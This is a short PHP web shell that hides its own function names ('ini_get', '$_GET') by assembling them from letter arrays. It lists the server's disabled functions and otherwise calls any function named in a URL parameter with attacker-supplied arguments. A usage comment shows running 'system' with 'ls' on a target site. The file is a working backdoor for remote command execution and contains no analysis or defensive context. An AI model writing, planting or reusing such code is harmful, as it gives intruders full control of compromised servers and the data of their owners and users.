<?php
/*
    Usage : http://target.com/ecchi.php?a=system&ecchi[]=ls
*/

$upp  = range('A', 'Z');
$low  = range('a', 'z');

$in   = $low[8] . $low[13] . $low[8];
$et   = $low[6] . $low[4] . $low[19];
$init = $in . '_' . $et; // ini_get

$p   = $low[4] . $low[2] . $low[2] . $low[7] . $low[8]; // ecchi
$g   = "_" . $upp[6] . $upp[4] . $upp[19]; // _GET
$g   = $$g; // $_GET

$exp = explode(",", $init('disable_functions'));
if (!isset($g[$low[0]])) {
    echo "Function Disable : " . $init('disable_functions');
} else {
    if (in_array($g[$low[0]], $exp)) {
        echo "Function Is Disable";
    } else {
        call_user_func_array($g[$low[0]], $g[$p]);
    }
}
